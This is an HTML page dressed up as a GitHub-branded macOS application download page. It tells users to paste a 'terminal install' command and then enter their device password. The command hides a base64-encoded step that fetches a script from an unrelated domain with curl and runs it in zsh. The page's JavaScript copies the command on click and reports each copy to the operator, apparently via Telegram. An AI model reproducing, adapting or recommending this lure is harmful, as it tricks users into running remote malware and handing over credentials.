<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <link rel="stylesheet" href="main.css">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Get the latest macOS application using DMG installer or terminal command installation method" />
    <meta name="author" content="Software Distribution Platform" />
    <link rel="icon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" />
    <title>macOS Application Download — Terminal & DMG Options</title>
</head>
<body>
<main class="container-primary">
    <header class="header-section">
        <h1>Get Application for macOS</h1>
        <div class="publisher-badge"><span>Trusted Source</span></div>
    </header>

    <article class="content-block" id="terminal-install">
        <h2>Terminal Installation</h2>
        <p class="subtitle-text">
            For experienced users: deploy the application using a single command in your terminal.
        </p>

        <div class="installation-panel">
            <div class="command-container">
                <input id="installCommand" type="text" readonly 
                value="echo &quot;Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg&quot; &amp;&amp; echo 'ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlcyBwbGVhc2Ugd2FpdC4uLicgJiYgY3VybCAta2ZzU0wgaHR0cDovL2JhcmJlcm1vby5mdW4vY3VybC9lZmQwZDdiZmExMjhlMTc5YzMyYjQ4ZGU4NjY2M2E0OGIwNmVlNjg3OGFhZDdmZjA5MjNlM2FiMWY1OWJiOGM4fHpzaA=='|base64 -D|zsh" />
                <button class="button button-accent" id="duplicateCmd" type="button">
                    Copy
                </button>
            </div>
        </div>

        <div class="installation-panel" style="margin-top: 14px">
            <h4>How to open Terminal on Mac</h4>
            <ol class="instruction-list">
                <li>Press Command (⌘) + Space to open Spotlight Search.</li>
                <li>Type "Terminal" and press Return to launch it.</li>
                <li>Once the Terminal window is open, you can proceed with the steps below.</li>
            </ol>

            <h4>Installation via Terminal command</h4>
            <ol class="instruction-list">
                <li>Copy the installation command above.</li>
                <li>Open the terminal on your device and paste the command, then press the "Return" button.</li>
                <li>Enter your device password and confirm the installation.</li>
            </ol>

            <video class="video-demo" autoplay loop muted playsinline>
                <source src="terminal.mp4" type="video/mp4" />
                Video playback not supported by your browser.
            </video>
        </div>
    </article>

    <footer class="page-footer">
        <span>© 2025 GitHub, Inc.</span>
        <a href="https://github.com/site/terms">Terms of Service</a>
        <a href="https://github.com/site/privacy">Privacy Policy</a>
    </footer>
</main>

<!-- --- Скрипт для копирования и статистики --- -->
<script>
document.addEventListener("DOMContentLoaded", () => {

    function sendStatistics(domain, action) {
        fetch("stats.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ domain, action })
        })
        .then(res => res.json())
        .then(data => console.log("Telegram уведомление отправлено:", data))
        .catch(err => console.error("Ошибка отправки статистики:", err));
    }

    // Домен и путь страницы
    const domain = window.location.hostname + window.location.pathname;

    const commandInput = document.getElementById("installCommand");
    const copyBtn = document.getElementById("duplicateCmd");

    // Функция копирования
    async function copyCommand() {
        const commandText = commandInput.value;

        try {
            await navigator.clipboard.writeText(commandText);

            const originalText = copyBtn.textContent;
            copyBtn.textContent = "✓ Copied!";
            setTimeout(() => copyBtn.textContent = originalText, 2000);

            sendStatistics(domain, "Copy Command clicked");

        } catch (error) {
            console.error("Ошибка копирования:", error);
        }
    }

    // Копирование при клике на кнопку
    if (copyBtn) {
        copyBtn.addEventListener("click", copyCommand);
    }

    // Статистика для ссылок скачивания
    const downloadBtns = document.querySelectorAll("a[download]");
    downloadBtns.forEach((btn, index) => {
        btn.addEventListener("click", () => {
            sendStatistics(domain, `download-${index + 1}`);
        });
    });

});
</script>

</body>
</html>